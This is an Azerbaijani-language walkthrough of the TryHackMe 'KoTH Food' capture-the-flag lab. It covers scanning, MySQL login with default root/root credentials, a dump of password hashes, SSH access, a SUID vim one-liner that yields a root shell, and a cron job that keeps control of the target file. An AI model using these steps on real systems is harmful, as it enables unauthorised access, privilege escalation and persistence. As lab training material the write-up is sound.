# TryHackMe — KoTH Food CTF Writeup (Azərbaycanca)

**Platforma:** TryHackMe  
**Otaq:** [KoTH Food CTF](https://tryhackme.com/room/kothfoodctf)  
**Növ:** King of the Hill (KoTH)  
**Çətinlik:** Asan  
**OS:** Ubuntu 18.04  
**Tarix:** 2026  

---

## 📋 Məzmun

1. [Kəşfiyyat (Reconnaissance)](#1-kəşfiyyat)
2. [Port 9999 — HTTP Xidməti](#2-port-9999--http-xidməti)
3. [MySQL (Port 3306)](#3-mysql-port-3306)
4. [SSH ilə Giriş](#4-ssh-ilə-giriş)
5. [Privilege Escalation](#5-privilege-escalation)
6. [King Faylının Ələ Keçirilməsi](#6-king-faylının-ələ-keçirilməsi)
7. [Nəticə](#7-nəticə)

---

## 1. Kəşfiyyat

### Nmap Skan

```bash
nmap -sV -sC -p- 10.81.152.242
```

**Tapılan portlar:**

| Port | Xidmət | Versiya |
|------|--------|---------|
| 22   | SSH    | OpenSSH 7.6p1 Ubuntu |
| 3306 | MySQL  | 5.7.29-0ubuntu0.18.04.1 |
| 9999 | HTTP   | Golang net/http server |

---

## 2. Port 9999 — HTTP Xidməti

```bash
curl http://10.81.152.242:9999
```

**Cavab:**
```
king
```

Bu KoTH oyununun əsas hədəfidir — `king` faylının içindəki mətn. Kim öz adını buraya yazarsa, o oyunçu "King" sayılır.

### Gobuster ilə Qovluq Skanı

```bash
gobuster dir -u http://10.81.152.242:9999 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 --exclude-length 4
```

Bütün sorğulara 200 cavabı qaytarıldığından `--exclude-length 4` parametri əlavə edildi.

---

## 3. MySQL (Port 3306)

### Default Credentials ilə Giriş

```bash
mysql -h 10.81.152.242 -u root -p'root' --skip-ssl
```

**Uğurlu giriş!**

### Database Araşdırması

```sql
show databases;
```

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```

### İstifadəçi Hash-larının Əldə Edilməsi

```sql
select user, host, authentication_string from mysql.user;
```

```
+------------------+-----------+-------------------------------------------+
| user             | host      | authentication_string                     |
+------------------+-----------+-------------------------------------------+
| root             | localhost | *81F5E21E35407D884A6CD4A731AEFBF6AF209E1B |
| mysql.session    | localhost | *THISISNOTAVALIDPASSWORD...               |
| mysql.sys        | localhost | *THISISNOTAVALIDPASSWORD...               |
| debian-sys-maint | localhost | *7F52B00E49043951CDA8A01D5FC82F95FEBEC6B8|
| root             | %         | *81F5E21E35407D884A6CD4A731AEFBF6AF209E1B|
+------------------+-----------+-------------------------------------------+
```

### Users Database

```sql
use users;
show tables;
select * from <cədvəl_adı>;
```

SSH üçün istifadəçi adı və şifrə tapıldı.

---

## 4. SSH ilə Giriş

```bash
ssh istifadeci@10.81.152.242
```

### Terminal Səliqəsi

Girişdən sonra terminalı düzəlt:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 150
```

---

## 5. Privilege Escalation

### SUID Fayllarını Tap

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Maraqlı tapıntılar:**

```
/usr/bin/vim.basic
/usr/bin/screen-4.5.0
/usr/bin/pkexec
```

### Metod 1 — vim.basic (Ən Asan)

```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

Root shell əldə edildi:

```bash
whoami
# root
```

### Metod 2 — screen-4.5.0 (CVE-2017-5618)

```bash
/usr/bin/screen-4.5.0 -x
```

---

## 6. King Faylının Ələ Keçirilməsi

Root oldaqdan sonra KoTH-un əsas hədəfi — `king` faylına adınızı yazın:

### King Faylını Tap

```bash
find / -name "king" 2>/dev/null
```

### Adınızı Yaz

```bash
echo "ADINIZ" > /root/king
```

### Port 9999-u Yoxla

```bash
curl http://10.81.152.242:9999
# ADINIZ
```

### Mövqeyi Qorumaq

Digər oyunçuların faylı dəyişməsinin qarşısını al:

```bash
# Faylı yalnız-oxu et
chmod 444 /root/king

# və ya cron ilə hər dəqiqə yenilə
echo "* * * * * echo 'ADINIZ' > /root/king" | crontab -
```

---

## 7. Nəticə

### İstifadə Olunan Alətlər

| Alət        | Məqsəd                          |
|-------------|----------------------------------|
| Nmap        | Port və servis skanı             |
| Gobuster    | Qovluq kəşfi                    |
| curl        | HTTP sorğuları                   |
| MySQL       | Database araşdırması             |
| vim.basic   | SUID ilə privilege escalation    |
| crontab     | King mövqeyini qorumaq           |

### Hücum Zənciri

```
Nmap Skanı
    ↓
MySQL root/root ilə giriş
    ↓
users DB-dən SSH credentials
    ↓
SSH girişi
    ↓
SUID vim.basic → Root
    ↓
King faylına ad yazıldı → 🏆
```

### Öyrənilən Dərslər

- Default şifrələr (`root/root`) həmişə sınandırılmalıdır
- MySQL-ə icazəsiz kənar giriş böyük risqdir
- SUID faylları privilege escalation üçün əsas hədəfdir
- `vim`, `screen` kimi alətlər SUID ilə root shell verə bilər
- KoTH oyunlarında mövqeyi cron ilə qorumaq vacibdir

---

*Bu writeup yalnız təhsil məqsədli hazırlanmışdır. TryHackMe platformasındakı KoTH Food CTF laboratoriyasına aiddir.*
